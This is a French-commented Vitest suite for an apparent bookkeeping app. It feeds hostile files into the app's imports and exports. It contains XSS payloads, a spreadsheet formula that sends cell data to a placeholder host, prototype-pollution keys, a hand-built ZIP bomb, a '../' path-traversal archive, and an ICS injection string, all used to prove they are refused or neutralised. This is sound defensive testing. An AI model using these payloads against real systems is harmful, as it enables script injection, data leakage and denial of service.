/** @vitest-environment jsdom */
/**
 * LE CORPUS D'ESSAIS HOSTILES (lot 59, constat S8).
 *
 * Chaque porte par laquelle un fichier entre — sauvegarde JSON, archive ZIP,
 * relevé CSV, pièce, compte — reçoit ce qu'un fichier fabriqué peut porter :
 * des clés qui visent le prototype, des nombres infinis ou démesurés, une
 * imbrication sans fond, cent mille lignes, des balises et des formules dans
 * chaque champ texte, une archive aux chemins piégés ou qui gonfle à
 * l'ouverture. Et ce qui sort — le livre CSV, le document HTML — est relu.
 *
 * Avant ce lot, rien ne prouvait la robustesse : aucune exécution n'avait été
 * constatée, mais rien ne l'aurait signalée si une modification en ouvrait une.
 */
import { readFileSync } from 'node:fs';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { cleanup, render, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { dateISO, euros, ratio } from '../domain/types';
import { livreRecettesCsv } from '../domain/calculs/livreRecettesCsv';
import { calendrierDesObligations } from '../state/selecteurs.calendrier';
import type { EcritureRecette } from '../domain/calculs/livreRecettes';
import { VERSION_SCHEMA, faitsVides } from '../state/schema';
import { motifRefusExterieur } from '../state/schema.exterieur';
import { useFaits } from '../state/store';
import { OPERATIONS_MAX_RELEVE, TAILLE_MAX_RELEVE, TAILLE_MAX_SAUVEGARDE } from '../infra/bornes';
import { lireReleve } from '../infra/releveCsv';
import { ErreurArchive, ecrireZip } from '../infra/archive.zip';
import { CHEMIN_FAITS, CHEMIN_MANIFESTE, lireArchive, restaurerPieces } from '../infra/justificatifs.archive';
import {
  TAILLE_MAX_OCTETS, deposerJustificatif, empreinteDe, stockageMemoireJustificatifs
} from '../infra/justificatifs';
import { documentAutonome } from '../infra/telechargement';
import { FournisseurToasts } from '../ui/components/Toasts';
import { Releve } from '../ui/screens/Releve';
import { Donnees } from '../ui/screens/Config.donnees';

afterEach(cleanup);
beforeEach(() => {
  useFaits.getState().initialiser(null);
  useFaits.setState({ faits: faitsVides() });
});

/**
 * Un fichier qui annonce `taille` octets et dont toute lecture échoue : s'il
 * est refusé avec le motif de taille, il l'a été SANS être lu. Un espion sur
 * le prototype captait aussi les lectures laissées en vol par d'autres essais.
 */
function fichierPiege(nom: string, type: string, taille: number): File {
  const f = new File(['x'], nom, { type });
  Object.defineProperty(f, 'size', { value: taille });
  for (const m of ['text', 'arrayBuffer', 'stream', 'slice', 'bytes']) {
    Object.defineProperty(f, m, { value: () => { throw new Error('fichier lu'); } });
  }
  return f;
}

/** Ce qu'une page aurait fait si une balise s'était exécutée. */
const pollue = (): unknown => (({}) as Record<string, unknown>)['pollue'];

/* ── Les valeurs ───────────────────────────────────────────────────────── */

/** Ce qu'un champ texte peut porter pour nuire, à l'écran ou dans un tableur. */
const TEXTES_HOSTILES = [
  '<img src=x onerror="window.__freelXss=1">',
  '<script>window.__freelXss=1</script>',
  '=HYPERLINK("https://exemple.invalid/?d="&A1;"clic")',
  '+SUM(1;1)',
  '-1+1',
  '@SUM(1;1)',
  '\t=1+1',
  'javascript:window.__freelXss=1'
] as const;

const blocHostile = (champs: Record<string, unknown>): string => JSON.stringify({ ...faitsVides(), ...champs });

const recetteHostile = (champs: Record<string, unknown>): string => JSON.stringify({
  ...faitsVides(),
  recettes: [{ id: 'r1', montant: 0, ...champs }]
});

/**
 * Les blocs se fabriquent en TEXTE puis passent par `JSON.parse`, comme un
 * fichier : un littéral objet `{ __proto__: … }` poserait un prototype, pas
 * une clé, et l'essai ne prouverait rien.
 */
const BLOCS_HOSTILES: readonly (readonly [string, string, RegExp])[] = [
  ['une clé __proto__ à la racine',
    `{"version":${VERSION_SCHEMA},"__proto__":{"pollue":true}}`, /__proto__/],
  ['constructor › prototype dans une facture',
    recetteHostile({ constructor: { prototype: { pollue: true } } }), /constructor/],
  ['un montant infini (1e309)',
    recetteHostile({ montant: '§' }).replace('"§"', '1e309'), /recettes › n° 1 › montant/],
  ['un montant démesuré (1e300)',
    recetteHostile({ montant: '§' }).replace('"§"', '1e300'), /hors de portée/],
  ['un montant négatif démesuré',
    recetteHostile({ montant: '§' }).replace('"§"', '-1e18'), /hors de portée/],
  ['une imbrication sans fond',
    recetteHostile({ note: '§' }).replace('"§"', `${'['.repeat(50_000)}${']'.repeat(50_000)}`), /imbriqué/],
  /* Schéma 25 : chaque nouveau champ commande une date ou un retard affiché.
     Une nature inconnue ne se relirait jamais — la DES déposée resterait en
     retard ; un lien vers `42` ferait disparaître un « payée le » ; une pièce
     datée « demain » ferait lever l'écran qui la compare au jour. */
  ['une période déclarée d’une nature inconnue',
    blocHostile({ periodesDeclarees: [{ nature: 'tva_imaginaire', periode: '2026-05', declareeLe: null }] }),
    /période déclarée n° 1/],
  ['une DES déposée pour une période sans forme',
    blocHostile({ periodesDeclarees: [{ nature: 'des', periode: 'mai', declareeLe: null }] }),
    /période déclarée n° 1/],
  ['un appel lié à une période qui n’est pas un texte',
    blocHostile({ echeances: [{ id: 'e1', nature: 'urssaf', montant: 1, echeanceLe: '2026-06-01', payeeLe: null, montantPaye: null, periode: 42 }] }),
    /échéance n° 1/],
  ['une pièce à fournir datée « demain »',
    blocHostile({ pieces: [{ id: 'p1', sorte: 'vigilance', libelle: 'Attestation', obtenueLe: 'demain', valableJusquau: null, provisoire: false }] }),
    /pièce à fournir n° 1/],
  ['une pièce d’une sorte inconnue, dans un bloc qui se dit au schéma 24',
    JSON.stringify({ version: 24, pieces: [{ id: 'p1', sorte: '<script>', libelle: '', obtenueLe: null, valableJusquau: null, provisoire: false }] }),
    /pièce à fournir n° 1/],
  ['un régime de TVA inconnu',
    blocHostile({ entreprise: { ...faitsVides().entreprise, regimeTva: 'au_hasard' } }), /regimeTva/],
  ['un nom d’exploitant qui n’est pas un texte',
    blocHostile({ entreprise: { ...faitsVides().entreprise, nomExploitant: { initiale: 'A' } } }), /nomExploitant/],
  /* Schéma 26 : une caisse inconnue se lirait « SSI » sans un mot, et un
     affilié Cipav cotiserait au mauvais taux sans l'avoir choisi. */
  ['une caisse de retraite inconnue',
    blocHostile({ entreprise: { ...faitsVides().entreprise, caisseRetraite: 'carpimko' } }), /caisseRetraite/]
];

describe('sauvegarde JSON, compte, archive : le bloc de faits', () => {
  it.each(BLOCS_HOSTILES)('refuse %s, et rien ne change', async (_, texte, motif) => {
    const brut: unknown = JSON.parse(texte);
    expect(motifRefusExterieur(brut)).toMatch(motif);

    const avant = useFaits.getState().faits;
    expect(await useFaits.getState().adopterFaitsDistants(brut)).toMatch(motif);
    expect(useFaits.getState().faits).toBe(avant);
    expect(pollue()).toBeUndefined();
  });

  /* Le contrôle ne doit pas refuser ce que l'application livre elle-même : la
     démonstration se charge par la même porte qu'une sauvegarde. */
  it('laisse passer le jeu de démonstration et le jeu d’essai, au schéma courant', () => {
    for (const chemin of ['public/jeu-de-demonstration.json', 'src/test/jeu-d-essai.json']) {
      expect(motifRefusExterieur(JSON.parse(readFileSync(chemin, 'utf8')))).toBeNull();
    }
  });

  it('laisse passer un dossier ordinaire, même chargé de textes hostiles', () => {
    const brut: unknown = JSON.parse(recetteHostile({ libelle: TEXTES_HOSTILES.join(' '), montant: 1200.5 }));
    expect(motifRefusExterieur(brut)).toBeNull();
  });

  it('refuse une sauvegarde trop lourde AVANT de la lire', async () => {
    render(<FournisseurToasts><Donnees stockage={stockageMemoireJustificatifs()} /></FournisseurToasts>);
    await userEvent.setup().upload(screen.getByLabelText('Restaurer une sauvegarde'),
      fichierPiege('freel.json', 'application/json', TAILLE_MAX_SAUVEGARDE + 1));
    await screen.findByText(/au-delà des 8\s+Mo acceptés/);
  });
});

/* ── Le relevé CSV ─────────────────────────────────────────────────────── */

describe('relevé CSV', () => {
  it(`refuse cent mille lignes, vite, au lieu d'en faire ${OPERATIONS_MAX_RELEVE.toLocaleString('fr-FR')} de trop`, () => {
    const lignes = ['Date;Libellé;Montant'];
    for (let i = 0; i < 100_000; i++) lignes.push(`15/07/2026;OPERATION ${i};-1,00`);
    const debut = performance.now();
    const lecture = lireReleve(lignes.join('\n'));
    expect(performance.now() - debut).toBeLessThan(2000);
    expect(lecture.statut).toBe('refuse');
    if (lecture.statut === 'refuse') expect(lecture.motif).toMatch(/plus de 10 000 lignes/);
  });

  it('écarte un montant que les flottants ne comptent plus au centime', () => {
    const lecture = lireReleve(['Date;Libellé;Montant', '15/07/2026;ENORME;-999999999999999999999,00',
      '16/07/2026;NORMAL;-12,00'].join('\n'));
    expect(lecture.statut).toBe('lu');
    if (lecture.statut === 'lu') {
      expect(lecture.rapport.lignes.map((l) => l.libelle)).toEqual(['NORMAL']);
      expect(lecture.rapport.ignorees).toHaveLength(1);
    }
  });

  it('refuse un relevé trop lourd AVANT de le lire', async () => {
    render(<Releve />);
    await userEvent.setup().upload(screen.getByLabelText(/Fichier CSV du relevé/i),
      fichierPiege('releve.csv', 'text/csv', TAILLE_MAX_RELEVE + 1));
    await screen.findByText(/au-delà des 5\s+Mo acceptés/);
    expect(useFaits.getState().faits.mouvementsBancaires).toEqual([]);
  });

  it('affiche les libellés hostiles comme du texte, sans rien exécuter', async () => {
    const csv = ['Date;Libellé;Montant',
      ...TEXTES_HOSTILES.map((t, i) => `${String(10 + i)}/07/2026;"${t.replace(/"/g, '""')}";-1,00`)].join('\n');
    const { container } = render(<Releve />);
    await userEvent.setup().upload(screen.getByLabelText(/Fichier CSV du relevé/i),
      new File([csv], 'releve.csv', { type: 'text/csv' }));
    await waitFor(() => expect(useFaits.getState().faits.mouvementsBancaires).toHaveLength(TEXTES_HOSTILES.length));
    expect(container.querySelector('img, script')).toBeNull();
    expect((window as unknown as { __freelXss?: unknown }).__freelXss).toBeUndefined();
    expect(container.textContent).toContain('<img src=x onerror=');
  });
});

/* ── L'archive ZIP ─────────────────────────────────────────────────────── */

const QUAND = new Date('2026-07-15T10:00:00');
const texte = (s: string): Blob => new Blob([s]);
const PDF = new Blob(['%PDF-1.4 pièce factice']);

async function manifestePour(piece: { typeMime: string; contenu: Blob; chemin: string }): Promise<string> {
  return JSON.stringify({
    format: 1, application: 'FREEL', produiteLe: QUAND.toISOString(),
    pieces: [{
      id: 'p1', nomFichier: 'ticket.pdf', typeMime: piece.typeMime, taille: piece.contenu.size,
      empreinte: await empreinteDe(piece.contenu), deposeLe: QUAND.toISOString(),
      fait: { nature: 'depense', id: 'd1' }, chemin: piece.chemin, dateDuFait: null,
      libelleDuFait: null, etat: 'intacte', orpheline: false
    }]
  });
}

async function archive(piece: { typeMime: string; contenu: Blob }): Promise<Blob> {
  const chemin = 'justificatifs/2026/ticket.pdf';
  return ecrireZip([
    { nom: CHEMIN_MANIFESTE, contenu: texte(await manifestePour({ ...piece, chemin })), date: QUAND },
    { nom: CHEMIN_FAITS, contenu: texte(JSON.stringify(faitsVides())), date: QUAND },
    { nom: chemin, contenu: piece.contenu, date: QUAND }
  ]);
}

/**
 * Une archive dont l'annuaire nomme deux fois les MÊMES octets : la forme
 * sans compression de la « bombe ZIP ». Construite à la main, puisque
 * l'écriture de l'application refuse de la produire.
 */
async function archiveQuiGonfle(): Promise<Blob> {
  const zip = new Uint8Array(await (await ecrireZip([
    { nom: 'a', contenu: new Blob([new Uint8Array(4096)]), date: QUAND }
  ])).arrayBuffer());
  const vue = new DataView(zip.buffer);
  const fin = zip.length - 22;
  const debutAnnuaire = vue.getUint32(fin + 16, true);
  const fiche = zip.slice(debutAnnuaire, fin);
  const double = fiche.slice();
  double[46] = 'b'.charCodeAt(0);
  const queue = zip.slice(fin);
  const vq = new DataView(queue.buffer);
  vq.setUint16(8, 2, true);
  vq.setUint16(10, 2, true);
  vq.setUint32(12, fiche.length * 2, true);
  return new Blob([zip.slice(0, fin), double, queue]);
}

describe('archive ZIP', () => {
  it('refuse une archive qui gonfle à l’ouverture', async () => {
    await expect(lireArchive(await archiveQuiGonfle())).rejects.toThrow(/gonfler à l’ouverture/);
  });

  it('refuse un chemin qui sort du dossier', async () => {
    const zip = new Uint8Array(await (await ecrireZip([
      { nom: 'aa/x', contenu: texte('x'), date: QUAND }
    ])).arrayBuffer());
    const fin = zip.length - 22;
    const annuaire = new DataView(zip.buffer).getUint32(fin + 16, true);
    zip.set(new TextEncoder().encode('../x'), annuaire + 46);
    await expect(lireArchive(new Blob([zip]))).rejects.toBeInstanceOf(ErreurArchive);
  });

  it('refuse des faits trop lourds AVANT de les lire', async () => {
    const zip = await ecrireZip([
      { nom: CHEMIN_MANIFESTE, contenu: texte('{}'), date: QUAND },
      { nom: CHEMIN_FAITS, contenu: new Blob([new Uint8Array(TAILLE_MAX_SAUVEGARDE + 1)]), date: QUAND }
    ]);
    const lire = vi.spyOn(Blob.prototype, 'text');
    await expect(lireArchive(zip)).rejects.toThrow(/freel-donnees\.json.*au-delà/);
    expect(lire).not.toHaveBeenCalled();
    lire.mockRestore();
  });

  it('ne restaure pas une pièce d’un type que le dépôt refuse', async () => {
    const page = new Blob(['<script>window.__freelXss=1</script>']);
    const lue = await lireArchive(await archive({ typeMime: 'text/html', contenu: page }));
    const stockage = stockageMemoireJustificatifs();
    const bilan = await restaurerPieces(lue, stockage);
    expect(bilan.ajoutees).toBe(0);
    expect(bilan.refusees[0]?.motif).toMatch(/format non accepté/);
    expect(stockage.contenu.size).toBe(0);
  });

  it('restaure une pièce ordinaire', async () => {
    const lue = await lireArchive(await archive({ typeMime: 'application/pdf', contenu: PDF }));
    const stockage = stockageMemoireJustificatifs();
    expect((await restaurerPieces(lue, stockage)).ajoutees).toBe(1);
  });
});

/* ── La pièce ──────────────────────────────────────────────────────────── */

describe('pièce déposée', () => {
  it('refuse une page HTML déguisée', async () => {
    const r = await deposerJustificatif(stockageMemoireJustificatifs(),
      { nom: 'ticket.pdf', typeMime: 'text/html', contenu: new Blob(['<script></script>']) },
      { nature: 'depense', id: 'd1' }, QUAND);
    expect(r.statut).not.toBe('ok');
  });

  it('refuse une pièce trop lourde AVANT de la lire', async () => {
    const r = await deposerJustificatif(stockageMemoireJustificatifs(),
      { nom: 'ticket.pdf', typeMime: 'application/pdf',
        contenu: fichierPiege('ticket.pdf', 'application/pdf', TAILLE_MAX_OCTETS + 1) },
      { nature: 'depense', id: 'd1' }, QUAND);
    expect(r).toMatchObject({ statut: 'refuse', motif: expect.stringMatching(/trop volumineux/) });
  });
});

/* ── Ce qui sort ───────────────────────────────────────────────────────── */

describe('ce qui sort : livre CSV, document HTML, calendrier .ics', () => {
  const ecriture = (modif: Partial<EcritureRecette>): EcritureRecette => ({
    id: 'r1', clientNom: 'Agence Démo', libelle: 'Conseil', montant: euros(100),
    emiseLe: dateISO('2026-03-01'), encaisseeLe: dateISO('2026-03-15'), modeReglement: 'virement',
    numero: 'F-1', tvaCollectee: euros(0), ...modif
  });

  it.each(['numero', 'clientNom', 'libelle'] as const)('neutralise toute formule dans « %s »', (champ) => {
    for (const t of TEXTES_HOSTILES.filter((x) => /^[=+\-@\t]/.test(x))) {
      const csv = livreRecettesCsv([ecriture({ [champ]: t })]);
      const ligne = csv.split('\r\n')[1] ?? '';
      // Aucune cellule ne commence par un caractère qui déclenche une formule,
      // guillemets de protection retirés.
      for (const cellule of ligne.split(';')) {
        expect(cellule.replace(/^"/, '')).not.toMatch(/^[=+\-@\t\r]/);
      }
    }
  });

  it('échappe le titre du document téléchargé', () => {
    const html = documentAutonome('</title><script>window.__freelXss=1</script>', '', '');
    expect(html).not.toContain('<script>');
  });

  /*
   * Le calendrier `.ics` (lot 53) : tout champ que l'utilisateur — ou un
   * fichier importé — remplit et qui pourrait y passer reçoit un texte qui
   * tente d'ouvrir un événement. Le fichier garde sa forme : chaque ligne
   * dépliée est une propriété connue, les événements s'ouvrent et se ferment
   * par paires, et aucun texte saisi n'y entre (ni client, ni libellé).
   */
  it('garde au calendrier sa forme, et n’y laisse entrer aucun texte saisi', () => {
    const injection = 'Pirate\r\nEND:VEVENT\r\nBEGIN:VEVENT\r\nSUMMARY:injecté;,\\';
    const faits = {
      ...faitsVides(),
      entreprise: {
        ...faitsVides().entreprise, nom: injection, nomExploitant: `Durand ${injection}`, codePostal: '33000',
        debutActivite: dateISO('2020-01-01')
      },
      clients: [{ id: 'c', nom: injection, adresse: '', siret: '', email: '', delaiPaiement: 'net_30' as const, pays: 'DE', tvaIntracom: '' }],
      recettes: [{ id: 'r', clientNom: injection, libelle: injection, montant: euros(9000),
        emiseLe: dateISO('2026-10-10'), encaisseeLe: dateISO('2026-10-10'), modeReglement: 'virement' as const, numero: injection }],
      missions: [{ id: injection, clientId: null, clientNom: injection, description: injection, tjm: euros(500),
        statut: 'active' as const, entites: [], debut: dateISO('2026-09-01'), fin: dateISO('2027-01-29') }],
      pieces: [{ id: injection, sorte: 'autre' as const, libelle: injection, obtenueLe: dateISO('2026-01-01'),
        valableJusquau: dateISO('2027-03-01'), provisoire: false }],
      depenses: [{ id: 'd', libelle: injection, fournisseur: injection, provenance: 'ue' as const, montantTtc: euros(145),
        tauxTva: ratio(0), payeeLe: dateISO('2026-11-05'), justificatifId: null, rapprochement: 'sans_banque' as const }]
    };
    const ics = calendrierDesObligations(faits, new Date('2026-11-17T09:00:00Z'), dateISO('2026-11-17'));
    const logiques = ics.replace(/\r\n /gu, '').split('\r\n').slice(0, -1);
    expect(logiques.filter((l) => l === 'BEGIN:VEVENT').length).toBeGreaterThan(0);
    expect(logiques.filter((l) => l === 'BEGIN:VEVENT').length).toBe(logiques.filter((l) => l === 'END:VEVENT').length);
    for (const l of logiques) {
      expect(l).toMatch(/^(BEGIN|END|VERSION|PRODID|CALSCALE|UID|DTSTAMP|DTSTART;VALUE=DATE|DTEND;VALUE=DATE|SUMMARY|DESCRIPTION|TRANSP|ACTION|TRIGGER)[:;]/u);
    }
    expect(ics).not.toMatch(/Pirate|injecté/u);
  });
});
